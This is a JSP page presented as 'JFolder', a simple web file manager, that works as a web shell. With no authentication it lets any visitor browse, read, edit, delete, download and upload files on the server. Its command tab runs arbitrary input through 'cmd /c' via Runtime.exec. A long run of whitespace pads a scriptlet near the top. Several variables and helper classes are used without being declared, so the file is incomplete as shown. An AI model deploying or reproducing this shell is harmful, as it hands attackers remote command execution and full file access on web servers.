<%
/**
JFolder V0.9  windows platform
@Filename： JFolder.jsp 
@Description： 一个简单的系统文件目录显示程序，类似于资源管理器，提供基本的文件操作，不过功能弱多了。
@Author： Steven Cee
@Email ： cqq1978@Gmail.com
@Bugs  :  下载时，中文文件名无法正常显示
*/
%>
<%@ page contentType="text/html;charset=gb2312"%>
<%@page import="java.io.*,java.util.*,java.net.*" %>
<%                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
%>
<%
request.setCharacterEncoding("gb2312");
String tabID = request.getParameter("tabID");
String strDir = request.getParameter("path");
String strAction = request.getParameter("action");
String strFile = request.getParameter("file");
String strPath = strDir + "\\" + strFile; 
String strCmd = request.getParameter("cmd");
StringBuffer sbEdit=new StringBuffer("");
StringBuffer sbDown=new StringBuffer("");
StringBuffer sbCopy=new StringBuffer("");
StringBuffer sbSaveCopy=new StringBuffer("");
StringBuffer sbNewFile=new StringBuffer("");

if((tabID==null) || tabID.equals(""))
{
	tabID = "1";
}

if(strDir==null||strDir.length()<1)
{
	strDir = request.getRealPath("/");
}


if(strAction!=null && strAction.equals("down"))
{
	File f=new File(strPath);
	if(f.length()==0)
	{
		sbDown.append("文件大小为 0 字节，就不用下了吧");
	}
	else
	{
		response.setHeader("content-type","text/html; charset=ISO-8859-1");
		response.setContentType("APPLICATION/OCTET-STREAM");	
		response.setHeader("Content-Disposition","attachment; filename=\""+f.getName()+"\"");
		FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());
		out.clearBuffer();
		int i;
		while ((i=fileInputStream.read()) != -1)
		{
			out.write(i);	
		}
		fileInputStream.close();
		out.close();
	}
}

if(strAction!=null && strAction.equals("del"))
{
	File f=new File(strPath);
	f.delete();
}

if(strAction!=null && strAction.equals("edit"))
{
	File f=new File(strPath);	
	BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(f)));
	sbEdit.append("<form name='frmEdit' action='' method='POST'>\r\n");
	sbEdit.append("<input type=hidden name=action value=save >\r\n");
	sbEdit.append("<input type=hidden name=path value='"+strDir+"' >\r\n");
	sbEdit.append("<input type=hidden name=file value='"+strFile+"' >\r\n");
	sbEdit.append("<input type=submit name=save value=' "+strFileSave[languageNo]+" '> ");
	sbEdit.append("<input type=button name=goback value=' "+strBack[languageNo]+" ' onclick='history.back(-1);'> &nbsp;"+strPath+"\r\n");
	sbEdit.append("<br><textarea rows=30 cols=90 name=content>");
	String line="";
	while((line=br.readLine())!=null)
	{
		sbEdit.append(htmlEncode(line)+"\r\n");		
	}
   sbEdit.append("</textarea>");
	sbEdit.append("<input type=hidden name=path value="+strDir+">");
	sbEdit.append("</form>");
}

if(strAction!=null && strAction.equals("save"))
{
	File f=new File(strPath);
	BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(f)));
	String strContent=request.getParameter("content");
	bw.write(strContent);
	bw.close();
}
if(strAction!=null && strAction.equals("copy"))
{
	File f=new File(strPath);
	sbCopy.append("<br><form name='frmCopy' action='' method='POST'>\r\n");
	sbCopy.append("<input type=hidden name=action value=savecopy >\r\n");
	sbCopy.append("<input type=hidden name=path value='"+strDir+"' >\r\n");
	sbCopy.append("<input type=hidden name=file value='"+strFile+"' >\r\n");
	sbCopy.append("原始文件： "+strPath+"<p>");
	sbCopy.append("目标文件： <input type=text name=file2 size=40 value='"+strDir+"'><p>");
	sbCopy.append("<input type=submit name=save value=' "+strFileCopy[languageNo]+" '> ");
	sbCopy.append("<input type=button name=goback value=' "+strBack[languageNo]+" ' onclick='history.back(-1);'> <p>&nbsp;\r\n");
	sbCopy.append("</form>");
}
if(strAction!=null && strAction.equals("savecopy"))
{
	File f=new File(strPath);
	String strDesFile=request.getParameter("file2");
	if(strDesFile==null || strDesFile.equals(""))
	{
		sbSaveCopy.append("<p><font color=red>目标文件错误。</font>");
	}
	else
	{
		File f_des=new File(strDesFile);
		if(f_des.isFile())
		{
			sbSaveCopy.append("<p><font color=red>目标文件已存在,不能复制。</font>");
		}
		else
		{
			String strTmpFile=strDesFile;
			if(f_des.isDirectory())
			{
				if(!strDesFile.endsWith("\\"))
				{
					strDesFile=strDesFile+"\\";
				}
				strTmpFile=strDesFile+"cqq_"+strFile;
			 }
			
			File f_des_copy=new File(strTmpFile);
			FileInputStream in1=new FileInputStream(f);
			FileOutputStream out1=new FileOutputStream(f_des_copy);
			byte[] buffer=new byte[1024];
			int c;
			while((c=in1.read(buffer))!=-1)
			{
				out1.write(buffer,0,c);
			}
			in1.close();
			out1.close();
	
			sbSaveCopy.append("原始文件 ："+strPath+"<p>");
			sbSaveCopy.append("目标文件 ："+strTmpFile+"<p>");
			sbSaveCopy.append("<font color=red>复制成功！</font>");			
		}		
	}	
	sbSaveCopy.append("<p><input type=button name=saveCopyBack onclick='history.back(-2);' value=返回>");
}
if(strAction!=null && strAction.equals("newFile"))
{
	String strF=request.getParameter("fileName");
	String strType1=request.getParameter("btnNewFile");
	String strType2=request.getParameter("btnNewDir");
	String strType="";
	if(strType1==null)
	{
		strType="Dir";
	}
	else if(strType2==null)
	{
		strType="File";
	}
	if(!strType.equals("") && !(strF==null || strF.equals("")))
	{		
			File f_new=new File(strF);			
			if(strType.equals("File") && !f_new.createNewFile())
				sbNewFile.append(strF+" 文件创建失败");
			if(strType.equals("Dir") && !f_new.mkdirs())
				sbNewFile.append(strF+" 目录创建失败");
	}
	else
	{
		sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");
	}
}

if((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith("multipart")))
{
	String tempdir=".";
	boolean error=false;
	response.setContentType("text/html");
	sbNewFile.append("<p><font color=red>建立文件或目录出错。</font>");
	HttpMultiPartParser parser = new HttpMultiPartParser();

	int bstart = request.getContentType().lastIndexOf("oundary=");
	String bound = request.getContentType().substring(bstart + 8);
	int clength = request.getContentLength();
	Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);
	if (ht.get("cqqUploadFile") != null)
	{

		FileInfo fi = (FileInfo) ht.get("cqqUploadFile");
		File f1 = fi.file;
		UplInfo info = UploadMonitor.getInfo(fi.clientFileName);
		if (info != null && info.aborted) 
		{
			f1.delete();
			request.setAttribute("error", "Upload aborted");
		}
		else 
		{
			String path = (String) ht.get("path");
			if(path!=null && !path.endsWith("\\")) 
				path = path + "\\";
			if (!f1.renameTo(new File(path + f1.getName()))) 
			{
				request.setAttribute("error", "Cannot upload file.");
				error = true;
				f1.delete();
			}
		}
	}
}
%>
<html>
<head>
<style type="text/css">
td,select,input,body{font-size:9pt;}
A { TEXT-DECORATION: none }

#tablist{
padding: 5px 0;
margin-left: 0;
margin-bottom: 0;
margin-top: 0.1em;
font:9pt;
}

#tablist li{
list-style: none;
display: inline;
margin: 0;
}

#tablist li a{
padding: 3px 0.5em;
margin-left: 3px;
border: 1px solid ;
background: F6F6F6;
}

#tablist li a:link, #tablist li a:visited{
color: navy;
}

#tablist li a.current{
background: #EAEAFF;
}

#tabcontentcontainer{
width: 100%;
padding: 5px;
border: 1px solid black;
}

.tabcontent{
display:none;
}

</style>

<script type="text/javascript">

var initialtab=[<%=tabID%>, "menu<%=tabID%>"]

////////Stop editting////////////////

function cascadedstyle(el, cssproperty, csspropertyNS){
if (el.currentStyle)
return el.currentStyle[cssproperty]
else if (window.getComputedStyle){
var elstyle=window.getComputedStyle(el, "")
return elstyle.getPropertyValue(csspropertyNS)
}
}

var previoustab=""

function expandcontent(cid, aobject){
if (document.getElementById){
highlighttab(aobject)
if (previoustab!="")
document.getElementById(previoustab).style.display="none"
document.getElementById(cid).style.display="block"
previoustab=cid
if (aobject.blur)
aobject.blur()
return false
}
else
return true
}

function highlighttab(aobject){
if (typeof tabobjlinks=="undefined")
collecttablinks()
for (i=0; i<tabobjlinks.length; i++)
tabobjlinks[i].style.backgroundColor=initTabcolor
var themecolor=aobject.getAttribute("theme")? aobject.getAttribute("theme") : initTabpostcolor
aobject.style.backgroundColor=document.getElementById("tabcontentcontainer").style.backgroundColor=themecolor
}

function collecttablinks(){
var tabobj=document.getElementById("tablist")
tabobjlinks=tabobj.getElementsByTagName("A")
}

function do_onload(){
collecttablinks()
initTabcolor=cascadedstyle(tabobjlinks[1], "backgroundColor", "background-color")
initTabpostcolor=cascadedstyle(tabobjlinks[0], "backgroundColor", "background-color")
expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])
}

if (window.addEventListener)
window.addEventListener("load", do_onload, false)
else if (window.attachEvent)
window.attachEvent("onload", do_onload)
else if (document.getElementById)
window.onload=do_onload



</script>
<script language="javascript">

function doForm(action,path,file,cmd,tab,content)
{
	document.frmCqq.action.value=action;
	document.frmCqq.path.value=path;
	document.frmCqq.file.value=file;
	document.frmCqq.cmd.value=cmd;
	document.frmCqq.tabID.value=tab;
	document.frmCqq.content.value=content;
	if(action=="del")
	{
		if(confirm("确定要删除文件 "+file+" 吗？"))
		document.frmCqq.submit();
	}
	else
	{
		document.frmCqq.submit();    
	}
}
</script>

<title>JFoler 0.9 ---A jsp based web folder management tool by Steven Cee</title>
<head>


<body>

<form name="frmCqq" method="post" action="">
<input type="hidden" name="action" value="">
<input type="hidden" name="path" value="">
<input type="hidden" name="file" value="">
<input type="hidden" name="cmd" value="">
<input type="hidden" name="tabID" value="2">
<input type="hidden" name="content" value="">
</form>

<!--Top Menu Started-->
<ul id="tablist">
<li><a href="http://www.smallrain.net" class="current" onClick="return expandcontent('menu1', this)"> <%=strFileManage[languageNo]%> </a></li>
<li><a href="new.htm" onClick="return expandcontent('menu2', this)" theme="#EAEAFF"> <%=strCommand[languageNo]%> </a></li>
<li><a href="hot.htm" onClick="return expandcontent('menu3', this)" theme="#EAEAFF"> <%=strSysProperty[languageNo]%> </a></li>
<li><a href="search.htm" onClick="return expandcontent('menu4', this)" theme="#EAEAFF"> <%=strHelp[languageNo]%> </a></li>
 &nbsp; <%=authorInfo[languageNo]%>
</ul>
<!--Top Menu End-->


<%
StringBuffer sbFolder=new StringBuffer("");
StringBuffer sbFile=new StringBuffer("");
try
{
	File objFile = new File(strDir);
	File list[] = objFile.listFiles();	
	if(objFile.getAbsolutePath().length()>3)
	{
		sbFolder.append("<tr><td >&nbsp;</td><td><a href=\"javascript:doForm('','"+formatPath(objFile.getParentFile().getAbsolutePath())+"','','"+strCmd+"','1','');\">");
		sbFolder.append(strParentFolder[languageNo]+"</a><br>- - - - - - - - - - - </td></tr>\r\n ");


	}
	for(int i=0;i<list.length;i++)
	{
		if(list[i].isDirectory())
		{
			sbFolder.append("<tr><td >&nbsp;</td><td>");
			sbFolder.append("  <a href=\"javascript:doForm('','"+formatPath(list[i].getAbsolutePath())+"','','"+strCmd+"','1','');\">");
			sbFolder.append(list[i].getName()+"</a><br></td></tr> ");
		}
		else
		{
		    String strLen="";
			String strDT="";
			long lFile=0;
			lFile=list[i].length();
			strLen = convertFileSize(lFile);
			Date dt=new Date(list[i].lastModified());
			strDT=dt.toLocaleString();
			sbFile.append("<tr onmouseover=\"this.style.backgroundColor='#FBFFC6'\" onmouseout=\"this.style.backgroundColor='white'\"><td>");
			sbFile.append(""+list[i].getName());	
			sbFile.append("</td><td>");
			sbFile.append(""+strLen);
			sbFile.append("</td><td>");
			sbFile.append(""+strDT);
			sbFile.append("</td><td>");

			sbFile.append(" &nbsp;<a href=\"javascript:doForm('edit','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
			sbFile.append(strFileEdit[languageNo]+"</a> ");

			sbFile.append(" &nbsp;<a href=\"javascript:doForm('del','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
			sbFile.append(strFileDel[languageNo]+"</a> ");

			sbFile.append("  &nbsp;<a href=\"javascript:doForm('down','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
			sbFile.append(strFileDown[languageNo]+"</a> ");

			sbFile.append("  &nbsp;<a href=\"javascript:doForm('copy','"+formatPath(strDir)+"','"+list[i].getName()+"','"+strCmd+"','"+tabID+"','');\">");
			sbFile.append(strFileCopy[languageNo]+"</a> ");
		}		

	}	
}
catch(Exception e)
{
	out.println("<font color=red>操作失败： "+e.toString()+"</font>");
}
%>

<DIV id="tabcontentcontainer">


<div id="menu3" class="tabcontent">
<br> 
<br> &nbsp;&nbsp; 未完成
<br> 
<br>&nbsp;

</div>

<div id="menu4" class="tabcontent">
<br>
<p>一、功能说明</p>
<p>&nbsp;&nbsp;&nbsp; jsp 版本的文件管理器，通过该程序可以远程管理服务器上的文件系统，您可以新建、修改、</p>
<p>删除、下载文件和目录。对于windows系统，还提供了命令行窗口的功能，可以运行一些程序，类似</p>
<p>与windows的cmd。</p>
<p>&nbsp;</p>
<p>二、测试</p>
<p>&nbsp;&nbsp;&nbsp;<b>请大家在使用过程中，有任何问题，意见或者建议都可以给我留言，以便使这个程序更加完善和稳定，<p>
留言地址为：<a href="http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx" target="_blank">http://blog.csdn.net/cqq/archive/2004/11/14/181728.aspx</a></b>
<p>&nbsp;</p>
<p>三、更新记录</p>
<p>&nbsp;&nbsp;&nbsp; 2004.11.15&nbsp; V0.9测试版发布，增加了一些基本的功能，文件编辑、复制、删除、下载、上传以及新建文件目录功能</p>
<p>&nbsp;&nbsp;&nbsp; 2004.10.27&nbsp; 暂时定为0.6版吧， 提供了目录文件浏览功能 和 cmd功能</p>
<p>&nbsp;&nbsp;&nbsp; 2004.09.20&nbsp; 第一个jsp&nbsp;程序就是这个简单的显示目录文件的小程序</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
</div>


<div id="menu1" class="tabcontent">
<%
out.println("<table border='1' width='100%' bgcolor='#FBFFC6' cellspacing=0 cellpadding=5 bordercolorlight=#000000 bordercolordark=#FFFFFF><tr><td width='30%'>"+strCurrentFolder[languageNo]+"： <b>"+strDir+"</b></td><td>" + getDrivers() + "</td></tr></table><br>\r\n");
%>
<table width="100%" border="1" cellspacing="0" cellpadding="5" bordercolorlight="#000000" bordercolordark="#FFFFFF">
       
        <tr> 
          <td width="25%" align="center" valign="top"> 
              <table width="98%" border="0" cellspacing="0" cellpadding="3">
 				<%=sbFolder%>
                </tr>                 
              </table>
          </td>
          <td width="81%" align="left" valign="top">
	
	<%
	if(strAction!=null && strAction.equals("edit"))
	{
		out.println(sbEdit.toString());
	}
	else if(strAction!=null && strAction.equals("copy"))
	{
		out.println(sbCopy.toString());
	}
	else if(strAction!=null && strAction.equals("down"))
	{
		out.println(sbDown.toString());
	}
	else if(strAction!=null && strAction.equals("savecopy"))
	{
		out.println(sbSaveCopy.toString());
	}
	else if(strAction!=null && strAction.equals("newFile") && !sbNewFile.toString().equals(""))
	{
		out.println(sbNewFile.toString());
	}
	else
	{
	%>
		<span id="EditBox"><table width="98%" border="1" cellspacing="1" cellpadding="4" bordercolorlight="#cccccc" bordercolordark="#FFFFFF" bgcolor="white" >
              <tr bgcolor="#E7e7e6"> 
                <td width="26%"><%=strFileName[languageNo]%></td>
                <td width="19%"><%=strFileSize[languageNo]%></td>
                <td width="29%"><%=strLastModified[languageNo]%></td>
                <td width="26%"><%=strFileOperation[languageNo]%></td>
              </tr>              
            <%=sbFile%>
             <!-- <tr align="center"> 
                <td colspan="4"><br>
                  总计文件个数：<font color="#FF0000">30</font> ，大小：<font color="#FF0000">664.9</font> 
                  KB </td>
              </tr>
			 -->
            </table>
			</span>
	<%
	}		
	%>

          </td>
        </tr>

	<form name="frmMake" action="" method="post">
	<tr><td colspan=2 bgcolor=#FBFFC6>
	<input type="hidden" name="action" value="newFile">
	<input type="hidden" name="path" value="<%=strDir%>">
	<input type="hidden" name="file" value="<%=strFile%>">
	<input type="hidden" name="cmd" value="<%=strCmd%>">
	<input type="hidden" name="tabID" value="1">
	<input type="hidden" name="content" value="">
	<%
	if(!strDir.endsWith("\\"))
	strDir = strDir + "\\";
	%>
	<input type="text" name="fileName" size=36 value="<%=strDir%>">
	<input type="submit" name="btnNewFile" value="新建文件" onclick="frmMake.submit()" > 
	<input type="submit" name="btnNewDir" value="新建目录"  onclick="frmMake.submit()" > 
	</form>		
	<form name="frmUpload" enctype="multipart/form-data" action="" method="post">
	<input type="hidden" name="action" value="upload">
	<input type="hidden" name="path" value="<%=strDir%>">
	<input type="hidden" name="file" value="<%=strFile%>">
	<input type="hidden" name="cmd" value="<%=strCmd%>">
	<input type="hidden" name="tabID" value="1">
	<input type="hidden" name="content" value="">
	<input type="file" name="cqqUploadFile" size="36">
	<input type="submit" name="submit" value="上传">
	</td></tr></form>
      </table>
</div>
<div id="menu2" class="tabcontent">

<%
String line="";
StringBuffer sbCmd=new StringBuffer("");

if(strCmd!=null) 
{
	try
	{
		//out.println(strCmd);
		Process p=Runtime.getRuntime().exec("cmd /c "+strCmd);
		BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
		while((line=br.readLine())!=null)
		{
			sbCmd.append(line+"\r\n");		
		}    
	}
	catch(Exception e)
	{
		System.out.println(e.toString());
	}
}
else
{
	strCmd = "set";
}

%>
<form name="cmd" action="" method="post">
&nbsp;
<input type="text" name="cmd" value="<%=strCmd%>" size=50>
<input type="hidden" name="tabID" value="2">
<input type=submit name=submit value="<%=strExecute[languageNo]%>">
</form>
<%
if(sbCmd!=null && sbCmd.toString().trim().equals("")==false)
{
%>
&nbsp;<TEXTAREA NAME="cqq" ROWS="20" COLS="100%"><%=sbCmd.toString()%></TEXTAREA>
<br>&nbsp;
<%
}
%>
</DIV>
</div>
<br><br>
<center><a href="http://www.topronet.com" target="_blank">www.topronet.com</a> ,All Rights Reserved.
<br>Any question, please email me cqq1978@Gmail.com

